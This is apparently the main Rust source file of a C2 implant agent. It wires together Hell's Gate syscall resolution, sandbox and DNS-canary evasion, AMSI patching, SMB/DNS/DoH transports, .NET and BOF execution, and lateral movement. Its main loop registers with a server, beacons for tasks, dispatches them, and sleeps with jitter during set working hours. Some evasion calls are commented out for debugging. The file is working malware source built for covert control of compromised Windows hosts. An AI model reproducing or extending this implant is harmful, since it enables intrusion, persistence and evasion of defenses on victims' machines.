// windows_subsystem temporarily disabled for debug build
// #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}
mod crypto;
mod transport;
mod transport_dns;
mod transport_doh;
#[cfg(target_os = "windows")]
mod transport_smb;
#[cfg(target_os = "windows")]
mod hells_gate;
#[cfg(target_os = "windows")]
mod api_hash;
mod commands;
#[cfg(target_os = "windows")]
mod evasion;
#[cfg(target_os = "windows")]
mod dotnet;
#[cfg(target_os = "windows")]
mod bof;
mod lateral;

use std::thread;
use std::time::Duration;
use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};

fn sleep_ms() -> u64 {
    use std::sync::atomic::Ordering;
    let base = {
        let s = DYN_SLEEP_SEC.load(Ordering::Relaxed);
        if s == u64::MAX { config::SLEEP_SEC } else { s }
    } * 1000;
    let pct = {
        let j = DYN_JITTER_PCT.load(Ordering::Relaxed);
        if j == u64::MAX { config::JITTER_PCT } else { j }
    };
    if pct == 0 { return base; }
    let jit = (base * pct / 100) as i64;
    let mut r = [0u8; 8];
    crypto::random_bytes(&mut r);
    let delta = (i64::from_le_bytes(r).abs() % (jit * 2 + 1)) - jit;
    (base as i64 + delta).max(1000) as u64
}

fn debug_log(msg: &str) {
    use std::io::Write;
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
        .open("C:\\Windows\\Temp\\rust_debug.log") {
        let _ = writeln!(f, "{}", msg);
    }
}

fn main() {
    // Child process mode for DOTNET_EXEC fork-and-run.
    #[cfg(target_os = "windows")]
    {
        let pid = unsafe { windows_sys::Win32::System::Threading::GetCurrentProcessId() };
        debug_log(&format!("process start pid={}", pid));
        if std::env::var("__ENDGAME_CLR_CHILD").is_ok() {
            debug_log(&format!("CLR child mode pid={} — entering clr_child_run", pid));
            crate::dotnet::clr_child_run();
            std::process::exit(0);
        }
        debug_log(&format!("normal agent mode pid={}", pid));
    }

    debug_log("main() start");
    #[cfg(target_os = "windows")]
    {
        debug_log("before hells_gate::init()");
        // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
        hells_gate::init();
        debug_log("after hells_gate::init()");
        // Skip api_hash::init() to isolate crash
        // api_hash::init();
        debug_log("after api_hash::init() (SKIPPED)");

        // Evasion: exit silently if running in a sandbox, then fire DNS canary
        evasion::sandbox_check();
        debug_log("after sandbox_check() — passed");
        // Skip patch_amsi() to isolate crash
        // evasion::patch_amsi();
        debug_log("after patch_amsi() (SKIPPED)");
        if !config::CANARY_DOMAIN.is_empty() {
            evasion::dns_canary_check(config::CANARY_DOMAIN);
        }
        debug_log("after canary check");
    }

    debug_log("before transport::AgentTransport::new()");
    let mut t = transport::AgentTransport::new();
    debug_log("after new transport; starting registration loop");

    // Registration loop — retry every 30 s until success
    loop {
        debug_log("attempting register()");
        if t.register() { debug_log("registered!"); break; }
        debug_log("register() failed; sleeping 30s");
        thread::sleep(Duration::from_secs(30));
    }

    // Beacon loop
    loop {
        #[cfg(target_os = "windows")]
        {
            // Working hours enforcement — sleep 60 s and re-check if outside the window
            if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
                // evasion::sleep_masked(60_000);
                thread::sleep(Duration::from_secs(60));
                continue;
            }
        }

        let tasks = t.beacon();
        for task in tasks {
            commands::dispatch(&mut t, &task);
        }

        // Disable sleep_masked() during debug — use plain sleep instead
        // #[cfg(target_os = "windows")]
        // evasion::sleep_masked(sleep_ms());
        // #[cfg(not(target_os = "windows"))]
        thread::sleep(Duration::from_millis(sleep_ms()));
    }
}
